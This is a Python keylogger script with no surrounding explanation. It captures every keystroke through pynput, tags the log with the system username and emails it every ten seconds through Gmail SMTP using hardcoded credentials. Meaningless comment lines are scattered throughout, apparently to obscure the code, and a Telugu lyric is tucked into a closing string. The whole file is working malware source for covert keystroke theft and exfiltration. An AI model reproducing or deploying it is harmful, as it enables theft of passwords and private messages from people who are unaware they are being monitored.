USERNAME = "Enter your email id here"
PASSWORD = "Enter your email password here"



import pynput.keyboard
#24213947329rueinfcdsiocndsc
import threading
#24213947329rueinfcdsiocndsc
import smtplib
#fasfasfasfasfasfasfsafasfasf
import os
#24213947329rueinfcdsiocndsc
username  = os.getenv('username')
#asfsafsafsafsafasfsafdsafwafsd
def send_mail(email,password,message):
#sdfsdfsdnfudsf9ubsubf9ubdsf
    server= smtplib.SMTP("smtp.gmail.com",587)
#snfjbdfubdsufy8dsvfy8vd8vf8yvsadfyvsdf
    server.starttls()
#sdfndsifbidsbfbdsu9fbds9fv9sdvf9sv9vsf97vdf9vf9vdf
    server.login(email,password)
#sdfnidsbf0UFVDU9VADU9FVUSVADF9VSD9FV9SUDVFVSD9FVSAF
    server.sendmail(email,email,message)
#DSFNISDBFOSU9ADFSVDUUDSVUSDUSUDVBOSDUBVOBSVD
    server.quit()
#24213947329rueinfcdsiocndsc

#SDVSDVSDVSDVA JOBSDVUIVSUUSVUB
#SDKVNINSIVISVNISNVINSVIN
log = " "
msg = " "
def process_key_press(key):
#WEFEWFEWFWEFWEFWEFWEF9WEGF9WEGFW9EFV9EWVF9VWEF
    global log,msg
#WEFEWCDSVDSVDSVDSVDSVDSVDSIVNSDBVBVBSVBSDBVSV
    try:
#DSVDSVDSIVNSDBVBVBSVBSDBVSVDSVDSVDSIVNSDBVBVBSVBSDBVSVDSVDSVDSIVNSDBVBVBSVBSDBVSV
        log += str(key.char)
        msg += str(key.char)
#DSVDSVDSIVNSDBVBVBSVBSDBVSVDSVDSVDSIVNSDBVBVBSVBSDBVSVDSVDSVDSIVNSDBVBVBSVBSDBVSVDSVDSVDSIVNSDBVBVBSVBSDBVSV
    except AttributeError:
#
        if key == key.space:
#
            log += " "
            msg += " "
        if key == key.backspace:
            msg  = msg[0:-1:1]
        
            
#SACASCASCSAC
#CACSAVASVASVSVA
        else:
#
            log += " "+str(key) + " "
        
    #print(key)


#
#
def report():
#
    global log,msg

    print("Sending")
#
    log+= "Processed Message" + msg
    try:
#
        send_mail(USERNAME,PASSWORD,username +"\n----------\n"+ log + "\nThe End")
    except Exception as e:
        print(e)
        pass
    log = " "
    msg = ' '
    timer = threading.Timer(10,report)
    timer.start()
    print("Done Sending")    

#
keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
#
with keyboard_listener:
    report()
#
    keyboard_listener.join()

'''
neee kalani patku odalanannadi chude naa kallu .. aa chupulanalla tokkuku vellaku daya leda asalu nee kallaki kavali kastaye
'''
